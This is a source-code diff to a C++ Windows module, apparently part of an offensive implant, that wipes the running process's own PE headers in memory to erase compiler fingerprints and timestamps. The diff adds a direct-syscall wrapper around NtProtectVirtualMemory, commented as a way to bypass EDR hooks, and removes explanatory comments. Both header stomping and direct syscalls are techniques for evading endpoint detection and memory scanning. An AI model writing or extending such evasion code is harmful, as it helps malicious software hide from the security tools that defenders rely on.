@@ -1,4 +1,5 @@
 #include "PEStamp.h"
+#include "DirectSyscall.h"
 
 static BYTE g_savedDosHeader[0x40] = {};
 static BYTE g_savedNtSig[4]        = {};
@@ -6,11 +7,26 @@ static bool g_saved = false;
 
 static PVOID GetBase() { return (PVOID)GetModuleHandleA(NULL); }
 
+// Call NtProtectVirtualMemory via direct syscall to bypass EDR hooks.
+static bool _SyscallProtect(void* addr, SIZE_T len, DWORD prot, DWORD* oldProt) {
+    int ssn = DirectSyscall::GetSSN(NT_PROTECT_VIRTUAL_MEM);
+    if (ssn < 0) return VirtualProtect(addr, len, prot, oldProt) != 0;
+    PVOID  base = (PVOID)((ULONG_PTR)addr & ~(ULONG_PTR)0xFFF);
+    SIZE_T sz   = ((ULONG_PTR)addr + len + 0xFFF - (ULONG_PTR)base) & ~(SIZE_T)0xFFF;
+    ULONG  old  = 0;
+    NTSTATUS st = DirectSyscall::Exec(ssn,
+        (ULONG_PTR)GetCurrentProcess(),
+        (ULONG_PTR)&base, (ULONG_PTR)&sz,
+        (ULONG_PTR)prot,  (ULONG_PTR)&old);
+    if (oldProt) *oldProt = (DWORD)old;
+    return st >= 0;
+}
+
 static bool Unprotect(PVOID addr, SIZE_T sz, DWORD* old) {
-    return VirtualProtect(addr, sz, PAGE_READWRITE, old) != 0;
+    return _SyscallProtect(addr, sz, PAGE_READWRITE, old);
 }
 static void Reprotect(PVOID addr, SIZE_T sz, DWORD old) {
-    DWORD tmp; VirtualProtect(addr, sz, old, &tmp);
+    DWORD tmp; _SyscallProtect(addr, sz, old, &tmp);
 }
 
 std::string PEStamp::StompMZ() {
@@ -32,7 +48,6 @@ std::string PEStamp::StompFull() {
     BYTE* base = (BYTE*)GetBase();
     auto* dos  = (PIMAGE_DOS_HEADER)base;
 
-    // Save before wiping
     if (!g_saved) {
         memcpy(g_savedDosHeader, base, sizeof(g_savedDosHeader));
         BYTE* ntHdr = base + dos->e_lfanew;
@@ -46,11 +61,6 @@ std::string PEStamp::StompFull() {
     if (!Unprotect(base, wipeSize, &old))
         return "PEStamp: VirtualProtect failed (need RW on header page)";
 
-    // Wipe everything from base to end of NT headers:
-    // - DOS header (0x00..0x3F)
-    // - DOS stub + Rich header (0x40..e_lfanew-1)  ← compiler fingerprint lives here
-    // - NT signature + file header + optional header (e_lfanew..+sizeof NT_HEADERS)
-    // The TimeDateStamp is inside FileHeader so it is also zeroed here.
     memset(base, 0, e_lfanew);
     memset(base + e_lfanew, 0, sizeof(IMAGE_NT_HEADERS));
 
@@ -69,7 +79,6 @@ std::string PEStamp::RestoreHeaders() {
     if (!Unprotect(base, sizeof(g_savedDosHeader), &old))
         return "PEStamp: restore VirtualProtect failed";
     memcpy(base, g_savedDosHeader, sizeof(g_savedDosHeader));
-    // Restore NT sig
     auto* dos = (PIMAGE_DOS_HEADER)base;
     BYTE* ntHdr = base + dos->e_lfanew;
     DWORD old2; Unprotect(ntHdr, 4, &old2);
